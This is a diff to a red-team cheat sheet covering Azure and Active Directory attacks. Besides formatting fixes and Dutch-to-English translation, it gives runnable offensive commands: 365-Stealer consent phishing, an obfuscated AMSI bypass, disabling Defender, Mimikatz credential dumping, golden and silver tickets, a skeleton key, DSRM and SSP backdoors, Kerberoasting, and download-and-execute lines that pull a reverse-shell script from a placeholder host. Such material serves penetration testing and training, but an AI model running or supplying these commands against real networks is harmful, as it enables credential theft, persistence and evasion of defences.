@@ -2413,7 +2413,7 @@ https://github.com/Mr-Un1k0d3r/RedTeamCSharpScripts
 https://github.com/google/tsunami-security-scanner
 
 
-# Resource
+# Resources
 
 
 1. [Cobalt Strike and Tradecraft]([https://hausec.com/2021/07/26/cobalt-strike-and-tradecraft/](https://hausec.com/2021/07/26/cobalt-strike-and-tradecraft/ "https://hausec.com/2021/07/26/cobalt-strike-and-tradecraft/")) 
@@ -2445,7 +2445,7 @@ https://github.com/google/tsunami-security-scanner
 26. [EDR - A Closer Look At Protect Services]([https://www.infosec.tirol/edr-a-closer-look-at-protected-services/](https://www.infosec.tirol/edr-a-closer-look-at-protected-services/ "https://www.infosec.tirol/edr-a-closer-look-at-protected-services/")) 
 27. [FindETWProviderImage]([https://github.com/matterpreter/FindETWProviderImage](https://github.com/matterpreter/FindETWProviderImage "https://github.com/matterpreter/FindETWProviderImage")) 
 28. [ETW Bypasses]([https://kwcsec.gitbook.io/the-red-team-handbook/techniques/defense-evasion/disabling-patching-telemetry/etw-bypasses](https://kwcsec.gitbook.io/the-red-team-handbook/techniques/defense-evasion/disabling-patching-telemetry/etw-bypasses "https://kwcsec.gitbook.io/the-red-team-handbook/techniques/defense-evasion/disabling-patching-telemetry/etw-bypasses")) 
-29. [Another method of bypassing ETW]([https://modexp.wordpress.com/2020/04/08/red-teams-etw/)](https://modexp.wordpress.com/2020/04/08/red-teams-etw/)](https://modexp.wordpress.com/2020/04/08/red-teams-etw/)](https://modexp.wordpress.com/2020/04/08/red-teams-etw/) "https://modexp.wordpress.com/2020/04/08/red-teams-etw/)](https://modexp.wordpress.com/2020/04/08/red-teams-etw/)") 
+29. [Another method of bypassing ETW][(https://modexp.wordpress.com/2020/04/08/red-teams-etw/)]
 30. [Hiding Your .NET - ETW]([https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/ "https://blog.xpnsec.com/hiding-your-dotnet-etw/"))
     
 31. [Ninja UUID Runner]([https://github.com/boku7/Ninja_UUID_Runner](https://github.com/boku7/Ninja_UUID_Runner "https://github.com/boku7/Ninja_UUID_Runner")) 
@@ -2901,12 +2901,19 @@ Check if users are allowed to consent to apps: `PS AzureADPreview> (GetAzureADMS
 :warning: Default port for 365-Stealer phishing is 443
 
 - Run XAMPP and start Apache
-- Clone 365-Stealer into `C:\xampp\htdocs\`
-    * `git clone https://github.com/AlteredSecurity/365-Stealer.git`
+- Clone 365-Stealer into 
+```console
+C:\xampp\htdocs\
+```
+```console
+git clone https://github.com/AlteredSecurity/365-Stealer.git
+```
 - Install the requirements
     * Python3
-    * PHP CLI or Xampp server
-    * `pip install -r requirements.txt`
+    * PHP CLI or Xampp server      
+```console
+pip install -r requirements.txt
+```
 - Enable sqlite3 (Xampp > Apache config > php.ini) and restart Apache
 - Edit `C:/xampp/htdocs/yourvictims/index.php` if needed
     - Disable IP whitelisting `$enableIpWhiteList = false;`
@@ -2918,11 +2925,16 @@ Check if users are allowed to consent to apps: `PS AzureADPreview> (GetAzureADMS
     - **Extension in OneDrive**: We can provide file extensions that we want to download from the victims account or provide `*` to download all the files present in the victims OneDrive. The file extensions should be comma separated like txt, pdf, docx etc. 
     - **Delay**: Delay the request by specifying time in seconds while stealing
 - Create a Self Signed Certificate to use HTTPS
-- Run the application either click on the button or run this command : `python 365-Stealer.py --run-app`
-    - `--no-ssl`: disable HTTPS
-    - `--port`: change the default listening port
-    - `--token`: provide a specific token
-    - `--refresh-token XXX --client-id YYY --client-secret ZZZ`: use a refresh token
+- Run the application either click on the button or run this command : 
+```console
+python 365-Stealer.py --run-app
+```
+```console
+    - --no-ssl: disable HTTPS
+    - --port: change the default listening port
+    - --token: provide a specific token
+    - --refresh-token XXX --client-id YYY --client-secret ZZZ: use a refresh token
+```
 - Find the Phishing URL: go to `https://<IP/Domain>:<Port>` and click on **Read More** button or in the console.
 
 **Mitigation**: Enable `Do not allow user consent` for applications in the "Consent and permissions menu".
@@ -2967,7 +2979,7 @@ $URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5
 
 ### Azure API via Python Version
 
-```py
+```python
 IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
 IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
 
@@ -2986,7 +2998,7 @@ print("ClientID/AccountID: "+json.loads(val)["client_id"])
 
 or inside a Python Function:
 
-```py
+```python
 import logging, os
 import azure.functions as func
 
@@ -3602,11 +3614,11 @@ Using [https://autologon.microsoftazuread-sso.com/](https://autologon.microsofta
 ## Nmap
 ___
 #### Ping Sweep
-console
+```console
 nmap -sn <CIDR Notation>        #Finding alive IP addresses in the subnet
-
+```
 You can also perform ping sweep using fping tool
-console
+```console
 fping -a -g 10.54.12.0/24 2>/dev/null
 ```
 
@@ -3793,18 +3805,7 @@ ___
 meterpreter> run autoroute -s <subnet>
 meterpreter > run autoroute -p      # show active route table
 ```
-
-
-
-
-
-
-
-
-
-
-
-
+---
 
 # Pwntools Cheatsheet
 
@@ -4328,14 +4329,7 @@ fmt_str.write(0x40018, 0xcafebabe)  # write 0xcafebabe at 0x40018
 fmt_str.execute_writes()
 ```
 
-
-
-
-
-
-
-
-
+---
 
 # Awesome-CobaltStrike-Resources
 <strong>Cobalt Strike is a commercial, full-featured, penetration testing tool which bills itself as "adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors". Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.
@@ -4730,15 +4724,7 @@ https://isc.sans.edu/diary/28008
 Mining The Shadows with ZoidbergStrike: A Scanner for Cobalt Strike</br>
 https://www.youtube.com/watch?v=MWr6bvrrYHQ
 
-
-
-
-
-
-
-
-
-
+---
 
 # Cobalt Strike CheatSheet
 
@@ -5008,15 +4994,15 @@ General notes and advices for cobalt strike C2 framework.
   ## Miscellaneous
    - **spawn:** Spawn a new beacon on the current machine, you can choose any type of listener you want.
    - **spawn Usage:**
-   ```
-   spawn [x86|x64] [listener]
    ```console
-   i.e.
+   spawn [x86|x64] [listener]
    ```
+   i.e.
+   ```console
    spawn x64 Lab-HTTPS
    spawn x86 Lab-SMB
-   ...
-   ```console
+   ```
+   
    - **spawnas:** Spawn a new beacon on the current machine as another user by providing credentials.
    - **spawnas Usage:**
    ```console
@@ -5969,115 +5955,115 @@ Invoke-allchecks
 ```
 
 ####  Run powerup get services with unqouted paths and a space in their name
-```
+```console
 Get-ServiceUnquoted -Verbose
 Get-ModifiableServiceFile -Verbose
 ```
 
 ####  Abuse service to get local admin permissions with powerup
-```
+```console
 Invoke-ServiceAbuse
 Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName '<domain>\<username>'
 ```
 
-####  Jekins
+####  Jenkins
 ```
 Runs as local admin, go to /job/project/configure to try to see if you have build permissions in /job/project0/configure
 Execute windows or shell comand into the build, you can also use powershell scripts
 ```
 
 ### Add user to local admin and RDP group and enable RDP on firewall
-```
+```console
 net user <username> <password> /add /Y   && net localgroup administrators <username> /add   && net localgroup "Remote Desktop Users" <username> /add && reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
 ```
 
 # Lateral Movement
 ## General
 #### Connect to machine with administrator privs
-```
+```console
 Enter-PSSession -Computername <computername>
 $sess = New-PSSession -Computername <computername>
 Enter-PSSession $sess
 ```
 
 #### Execute commands on a machine
-```
+```console
 Invoke-Command -Computername <computername> -Scriptblock {whoami} 
 Invoke-Command -Scriptblock {whoami} $sess
 ```
 
 #### Load script on a machine
-```
+```console
 Invoke-Command -Computername <computername> -FilePath <path>
 Invoke-Command -FilePath <path> $sess
 ```
 
 #### Download and load script on a machine
-```
+```console
 iex (iwr http://xx.xx.xx.xx/<scriptname> -UseBasicParsing)
 ```
 
 #### AMSI Bypass
-```
+```console
 sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
 ```
 
-```
+```console
 Invoke-Command -Scriptblock {sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )} $sess
 ```
 
 #### Disable AV monitoring
-```
+```console
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 
 #### Execute locally loaded function on a list of remote machines
-```
+```console
 Invoke-Command -Scriptblock ${function:<function>} -Computername (Get-Content <list_of_servers>)
 Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Computername (Get-Content <list_of_servers>)
 ```
 
 #### Check the language mode
-```
+```console
 $ExecutionContext.SessionState.LanguageMode
 ```
 
 #### Enumerate applocker policy
-```
+```console
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 ```
 
 #### Copy script to other server
 ps you can edit the script and call the method you wish so it executes, since you still cant load it in
-```
+```console
 Copy-Item .\Invoke-MimikatzEx.ps1 \\<servername>\c$\'Program Files'
 ```
 
 ## Mimikatz
 #### Mimikatz dump credentials on local machine
-```
+```console
 Invoke-Mimikatz -Dumpcreds
 ```
 
 #### Mimikatz dump credentials on multiple remote machines
-```
+```console
 Invoke-Mimikatz -Dumpcreds -Computername @(“<system1>”,”<system2>”)
 Invoke-Mimikatz -Dumpcreds -ComputerName @("<computername 1>","<computername 2>")
 ```
 
 #### Mimikatz start powershell pass the hash (run as local admin)
-```
+```console
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<ntlm hash> /run:powershell.exe"'
 ```
 
 #### Mimikatz dump from SAM
-```
+```console
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam"'
 ```
 
 or
 
-```
+```console
 reg save HKLM\SAM SamBkup.hiv
 reg save HKLM\System SystemBkup.hiv
 #Start mimikatz as administrator
@@ -6087,62 +6073,62 @@ lsadump::sam SamBkup.hiv SystemBkup.hiv
 ```
 
 #### Mimikatz dump lsa (krbtgt to)
-```
+```console
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
 ```
 
 # Domain persistence
 ## Golden ticket
-Golden tickets zijn nagemaakte TGT tickets. TGT tickets worden gebruikt om TGS tickets aan te vragen bij de KDC(DC). De kerberos Golden Ticket is een valid TGT omdat deze ondertekend is door het KRBTGT account. Als je de hash van de KRBTGT account kan achterhalen door de hashes te dumpen op de Domain controller en deze hash niet wijzigt is het mogelijk om weer een TGT aan te vragen bij de volgende penetratietest en volledige toegang tot het domein te verkrijgen.
+Golden tickets are counterfeit TGT tickets. TGT tickets are used to request TGS tickets from the KDC(DC). The Kerberos Golden Ticket is a valid TGT because it is signed by the KRBTGT account. If you can determine the hash of the KRBTGT account by dumping the hashes on the Domain controller and do not change this hash, it is possible to request a TGT again during the next penetration test and gain full access to the domain.
 
 https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets
 
 #### Dump hashes - Get the krbtgt hash
-```
+```console
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
 ```
 
 #### Make golden ticket
 Use /ticket instead of /ptt to save the ticket to file instead of loading in current powershell process
 To get the SID use ```Get-DomainSID``` from powerview
-```
+```console
 Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /krbtgt:<hash> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 ```
 
 #### Use the DCSync feature for getting krbtgt hash. Execute with DA privileges
-```
+```console
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
 ```
 
 #### Check WMI Permission
-```
+```console
 Get-wmiobject -Class win32_operatingsystem -ComputerName <computername>
 ```
 
 ## Silver ticket
-Silver tickets zijn nagemaakte TGS tickets. Omdat de ticket is nagemaakt op de workstation is er geen communicatie met de DC. Eeen silver ticket kan worden aangemaakt met de service account hash of computer account hash.
+Silver tickets are counterfeit TGS tickets. Because the ticket has been counterfeited on the workstation, there is no communication with the DC. A silver ticket can be created with the service account hash or computer account hash.
 
 https://adsecurity.org/?p=2011
 https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets
 
 #### Make silver ticket for CIFS
 Use the hash of the local computer
-```
+```console
 Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:CIFS /rc4:<local computer hash> /user:Administrator /ptt"'
 ```
 
 #### Check access (After CIFS silver ticket)
-```
+```console
 ls \\<servername>\c$\
 ```
 
 #### Make silver ticket for Host
-```
+```console
 Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:HOST /rc4:<local computer hash> /user:Administrator /ptt"'
 ```
 
 #### Schedule and execute a task (After host silver ticket)
-```
+```console
 schtasks /create /S <target> /SC Weekly /RU "NT Authority\SYSTEM" /TN "Reverse" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1''')'"
 
 schtasks /Run /S <target> /TN “Reverse”
@@ -6150,59 +6136,59 @@ schtasks /Run /S <target> /TN “Reverse”
 
 #### Make silver ticket for WMI
 Execute for WMI /service:HOST /service:RPCSS
-```
+```console
 Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:HOST /rc4:<local computer hash> /user:Administrator /ptt"'
 
 Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:RPCSS /rc4:<local computer hash> /user:Administrator /ptt"'
 ```
 
 #### Check WMI Permission
-```
+```console
 Get-wmiobject -Class win32_operatingsystem -ComputerName <target>
 ```
 
 ## Skeleton key
-De skeleton key attack is een aanval dat malware in het geheugen laad van de domain controller. Waarna het mogelijk is om als elke user the authenticeren met een master wachtwoord. Als je dit met mimikatz uitvoert is dit wachwoord 'mimikatz'. Dit laad een grote security gat waarbij dit wordt uitgevoerd! Voer dit dus niet uit in een productieomgeving zonder goed te overleggen met de klant. Om deze aanval te stoppen moet de domain controller worden herstart.
+The skeleton key attack is an attack that loads malware into the memory of the domain controller. After which it is possible to authenticate as each user with a master password. If you do this with mimikatz, the password is 'mimikatz'. This opens a major security hole where this is implemented! So do not carry out this in a production environment without properly consulting the customer. To stop this attack, the domain controller must be restarted.
 
 https://pentestlab.blog/2018/04/10/skeleton-key/
 
 #### Create the skeleton key - Requires DA
-```
+```console
 Invoke-MimiKatz -Command '"privilege::debug" "misc::skeleton"' -Computername <target>
 ```
 
 ## DSRM
-De Directory Services Restore Mode is een boot option waarin een domain controller kan worden opgestart zodat een administrator reparaties of een recovery kan uitvoeren op de active directory database. Dit wachtwoord wordt ingesteld tijdens het installeren van de domain controller en wordt daarna bijna nooit gewijzigd. Door de login behavior aan te passen van dit lokale account is het mogelijk om remote toegang te verkrijgen via dit account, een account waarvan het wachtwoord bijna nooit wijzigd! Pas op, dit tast de security van de domain controller aan!
+The Directory Services Restore Mode is a boot option in which a domain controller can be started so that an administrator can perform repairs or a recovery on the active directory database. This password is set during the installation of the domain controller and is almost never changed afterwards. By adjusting the login behavior of this local account it is possible to gain remote access via this account, an account for which the password is almost never changed! Be careful, this affects the security of the domain controller!
 
 #### Dump DSRM password - dumps local users
 look for the local administrator password
-```
+```console
 Invoke-Mimikatz -Command ‘”token::elevate” “lsadump::sam”’ -Computername <target>
 ```
 
 #### Change login behavior for the local admin on the DC
-```
+```console
 New-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD
 ```
 
 #### If property already exists
-```
+```console
 Set-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2
 ```
 
 #### Pass the hash for local admin
-```
+```console
 Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<computer> /user:Administrator /ntlm:<hash> /run:powershell.exe"'
 ```
 
 ## Custom SSP - Track logons
-Het is mogelijk om met een custom Security Support Provider (SSP) alle logons op een computer bij te houden. Een SSP is een DDL. Een SSP is een DLL waarmee een applicatie een geverifieerde verbinding kan verkrijgen. Sommige SSP-pakketten van Microsoft zijn: NTLM, Kerberos, Wdigest, credSSP. 
+It is possible to keep track of all logins on a computer with a custom Security Support Provider (SSP). An SSP is a DDL. An SSP is a DLL that allows an application to obtain an authenticated connection. Some SSP packages from Microsoft are: NTLM, Kerberos, Wdigest, credSSP.
 
-Mimikatz biedt een aangepaste SSP - mimilib.dll aan. Deze SSP registreert lokale aanmeldingen, serviceaccount- en computeraccountwachtwoorden in platte tekst op de doelserver.
+Mimikatz offers a custom SSP - mimilib.dll. This SSP records local logins, service account, and computer account passwords in plain text on the target server.
 
 #### Mimilib.dll
 Drop mimilib.dll to system32 and add mimilib to HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
-```
+```console
 $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
 $packages += "mimilib"
 SetItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
@@ -6211,28 +6197,28 @@ Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Pac
 
 #### Use mimikatz to inject into lsass
 all logons are logged to C:\Windows\System32\kiwissp.log
-```
+```console
 Invoke-Mimikatz -Command ‘”misc:memssp”’
 ```
 
 ## ACL
 ### AdminSDHolder
-De AdminSDHolder container is een speciale AD container met default security permissies die gebruikt worden als template om beveiligde AD gebruikers en groepen (Domain Admins, Enterprise Admins etc.) te beveiligen en te voorkomen dat hier onbedoeld wijzingen aan worden uitgevoerd. Nadater er toegang is verkregen tot een DA is het mogelijk om deze container aan te passen voor persistence.
+The AdminSDHolder container is a special AD container with default security permissions that are used as a template to secure secured AD users and groups (Domain Admins, Enterprise Admins, etc.) and to prevent unintentional changes to them. After accessing a DA, it is possible to modify this container for persistence.
 
 https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence
 
 #### Check if student has replication rights
-```
+```console
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "<username>") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
 ```
 
 #### Add fullcontrol permissions for a user to the adminSDHolder
-```
+```console
 Add-ObjectAcl -TargetADSprefix ‘CN=AdminSDHolder,CN=System’ PrincipalSamAccountName <username> -Rights All -Verbose
 ```
 
 #### Run SDProp on AD (Force the sync of AdminSDHolder)
-```
+```console
 Invoke-SDPropagator -showProgress -timeoutMinutes 1
 
 #Before server 2008
@@ -6240,260 +6226,261 @@ Invoke-SDpropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -
 ```
 
 #### Check if user got generic all against domain admins group
-```
+```console
 Get-ObjectAcl -SamaccountName “Domain Admins” –ResolveGUIDS | ?{$_.identityReference -match ‘<username>’}
 ```
 
 #### Add user to domain admin group
-```
+```console
 Add-DomainGroupMember -Identity ‘Domain Admins’ -Members <username> -Verbose
 ```
 
 or
 
-```
+```console
 Net group "domain admins" sportless /add /domain
 ```
 
 #### Abuse resetpassword using powerview_dev
-```
+```console
 Set-DomainUserPassword -Identity <username> -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force ) -Verbose
 ```
 
 ### DCsync
-Bij een DCSync aanval immiteren we een DC om de wachtwoorden te achterhalen via domain replication. Hiervoor hebben we bepaalde rechten nodig op de domain controller.
+In a DCSync attack we impersonate a DC to retrieve the passwords via domain replication. For this we need certain rights on the domain controller.
 
 https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync
 https://blog.stealthbits.com/what-is-dcsync-an-introduction/
 
 #### Add full-control rights
-```
+```console
 Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,DC=local’ -PrincipalSamAccountName <username> -Rights All -Verbose
 ```
 
 #### Add rights for DCsync
-```
+```console
 Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,Dc=local’ -PrincipalSamAccountName <username> -Rights DCSync -Verbose
 ```
 
 #### Execute DCSync and dump krbtgt
-```
+```console
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
 ```
 
 ### SecurityDescriptor - WMI
-```
+```console
 . ./Set-RemoteWMI.ps1
 ```
 
 #### On a local machine
-```
+```console
 Set-RemoteWMI -Username <username> -Verbose
 ```
 
 #### On a remote machine without explicit credentials
-```
+```console
 Set-RemoteWMI -Username <username> -Computername <computername> -namespace ‘root\cimv2’ -Verbose
 ```
 
 #### On a remote machine with explicit credentials
 Only root/cimv and nested namespaces
-```
+```console
 Set-RemoteWMI -Username <username> -Computername <computername> -Credential Administrator -namespace ‘root\cimv2’ -Verbose
 ```
 
 #### On remote machine remove permissions
-```
+```console
 Set-RemoteWMI -Username <username> -Computername <computername> -namespace ‘root\cimv2’ -Remove -Verbose
 ```
 
 #### Check WMI permissions
-```
+```console
 Get-wmiobject -Class win32_operatingsystem -ComputerName <computername>
 ```
 
 ### SecurityDescriptor - Powershell Remoting
-```
+```console
 . ./Set-RemotePSRemoting.ps1
 ```
 
 #### On a local machine
-```
+```console
 Set-RemotePSRemoting -Username <username> -Verbose
 ```
 
 #### On a remote machine without credentials
-```
+```console
 Set-RemotePSRemoting -Username <username> -Computername <computername> -Verbose
 ```
 
 #### On a remote machine remove permissions
-```
+```console
 Set-RemotePSRemoting -Username <username> -Computername <computername> -Remove
 ```
 
 ### SecurityDescriptor - Remote Registry
 Using the DAMP toolkit
-```
+```console
 . ./Add-RemoteRegBackdoor
 . ./RemoteHashRetrieval
 ```
 
 #### Using DAMP with admin privs on remote machine
-```
+```console
 Add-RemoteRegBackdoor -Computername <computername> -Trustee <username> -Verbose
 ```
 
 #### Retrieve machine account hash from local machine
-```
+```console
 Get-RemoteMachineAccountHash -Computername <computername> -Verbose
 ```
 
 #### Retrieve local account hash from local machine
-```
+```console
 Get-RemoteLocalAccountHash -Computername <computername> -Verbose
 ```
 
 #### Retrieve domain cached credentials from local machine
-```
+```console
 Get-RemoteCachedCredential -Computername <computername> -Verbose
 ```
 # Domain Privilege escalation
 ## Kerberoast
-Kerberoasting een technique waarbij de wachtwoorden van service accounts worden gekraakt. Kerberoasting is voornamelijk efficient indien er user accounts als service accounts worden gebruikt. Een TGS ticket kan worden aangevraagd voor deze user, waarbij de TGS versleuteld is met de NTLM hash van de plaintext wachtwoord van de gebruiker. Als de service account een user account is welke zelf is aangemaakt door de beheerder is de kans groter dat deze ticket te kraken is, en dus het wachtwoord wordt achterhaalt voor de service. Deze TGS ticket kan offline gekraakt worden. Voor de aanval word de kerberoas[https://github.com/nidem/kerberoast] repositorie van Nidem gebruikt.
+Kerberoasting a technique in which the passwords of service accounts are cracked. Kerberoasting is mainly efficient if user accounts are used as service accounts. A TGS ticket can be requested for this user, where the TGS is encrypted with the NTLM hash of the user's plaintext password. If the service account is a user account created by the administrator, there is a greater chance that this ticket can be cracked, and therefore the password for the service will be determined. This TGS ticket can be cracked offline. Nidem's kerberoas[https://github.com/nidem/kerberoast] repository is used for the attack.
+
 #### Find user accounts used as service accounts
-```
+```console
 . ./GetUserSPNs.ps1
 ```
-```
+```console
 Get-NetUser -SPN
 ```
-```
+```console
 Get-NetUser -SPN | select samaccountname,serviceprincipalname
 ```
 
 #### Reguest a TGS
-```
+```console
 Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
 ```
 or
-```
+```console
 Request-SPNTicket "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
 ```
 
 #### Export ticket using Mimikatz
-```
+```console
 Invoke-Mimikatz -Command '"Kerberos::list /export"'
 ```
 
 #### Crack the ticket
 Crack the password for the serviceaccount
-```
+```console
 python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-student1@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
 ```
 
-```
+```console
 .\hashcat.exe -m 18200 -a 0 <HASH FILE> <WORDLIST>
 ```
 
 ## AS-REPS Roasting
-AS-REPS roasting is een technique waarbij het wachtwoord achterhaald kan worden omdat de 'Do not require Kerberos preauthentication property' is aangezet, oftewel kerberos preauthentication staat uit. Een aanvaller kan de eerste stap van authenticatie overslaan en voor deze gebruiker een TGT aanvragen, welke vervolgens offline gekraakt kan worden.
+AS-REPS roasting is a technique in which the password can be determined because the 'Do not require Kerberos preauthentication property' is enabled, i.e. Kerberos preauthentication is turned off. An attacker can skip the first step of authentication and request a TGT for this user, which can then be cracked offline.
 #### Enumerating accounts with kerberos preauth disabled
-```
+```console
 . .\Powerview_dev.ps1
 Get-DomainUser -PreauthNotRequired -Verbose
 ```
-```
+```console
 Get-DomainUser -PreauthNotRequired -verbose | select samaccountname
 ```
 
 #### Enumerate permissions for group
-Met genoeg rechten(GenericWrite of GenericAll) is het mogelijk om kerberos preauth uit te schakelen.
-```
+With enough permissions (GenericWrite or GenericAll) it is possible to disable kerberos preauth.
+```console
 Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”}
 Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”} | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
 ```
 
 #### Set preauth not required
-```
+```console
 . ./PowerView_dev.ps1
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
 
 #### Request encrypted AS-REP
-```
+```console
 . ./ASREPRoast.ps1
 Get-ASREPHash -Username <username> -Verbose
 ```
 
 #### Enumerate all users with kerberos preauth disabled and request a hash
-```
+```console
 Invoke-ASREPRoast -Verbose
 Invoke-ASREPRoast -Verbose | fl
 ```
 
 #### Crack the hash with hashcat
 Edit the hash by inserting '23' after the $krb5asrep$, so $krb5asrep$23$.......
-```
+```console
 Hashcat -a 0 -m 18200 hash.txt rockyou.txt
 ```
 
 ## Set SPN
-Met genoeg rechten (GenericALL en GenericWrite) is het mogelijk om zelf de Service Principle Name attribute aan een gebruiker toe te voegen. Deze kan dan worden gekraakt met behulp van kerberoasting.
+With enough rights (GenericALL and GenericWrite) it is possible to add the Service Principle Name attribute to a user yourself. This can then be cracked using kerberoasting.
 
 #### Enumerate permissions for group on ACL
-```
+```console
 Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”}
 Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”} | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
 ```
 
 #### Check if user has SPN
-```
+```console
 . ./Powerview_dev.ps1
 Get-DomainUser -Identity <username> | select samaccountname, serviceprincipalname
 ```
 
-of
+or
 
-```
+```console
 Get-NetUser | Where-Object {$_.servicePrincipalName}
 ```
 
 #### Set SPN for the user
-```
+```console
 . ./PowerView_dev.ps1
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname=’ops/whatever1’}
 ```
 
 #### Request a TGS
-```
+```console
 Add-Type -AssemblyName System.IdentityModel 
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/whatever1"
 ```
 
 #### Export ticket to disk for offline cracking
-```
+```console
 Invoke-Mimikatz -Command '"Kerberos::list /export"'
 ```
 
 #### Request TGS hash for offline cracking hashcat
-```
+```console
 Get-DomainUser -Identity <username> | Get-DomainSPNTicket | select -ExpandProperty Hash
 ```
 
 #### Crack the hash with hashcat
 Edit the hash by inserting '23' after the $krb5asrep$, so $krb5asrep$23$.......
-```
+```console
 Hashcat -a 0 -m 18200 hash.txt rockyou.txt
 ```
 
 ## Unconstrained Delegation
-Unconstrained delegation is een privilege welke kan worden toegekent aan gebruikers of computers, dit gebeurt bijna altijd bij computers met services zoals ISS en MSSQL. Deze services hebben meestal toegang nodig tot een backend database namens de geverifieerde gebruiker. Wanneer een gebruiker zich verifieert op een computer waarop onbeperkt Kerberos-delegatierecht is ingeschakeld, wordt het geverifieerde TGT-ticket van de gebruiker opgeslagen in het geheugen van die computer. Als je administrator toegang hebt tot deze server, is het mogelijk om alle TGT tickets uit het geheugen te dumpen.
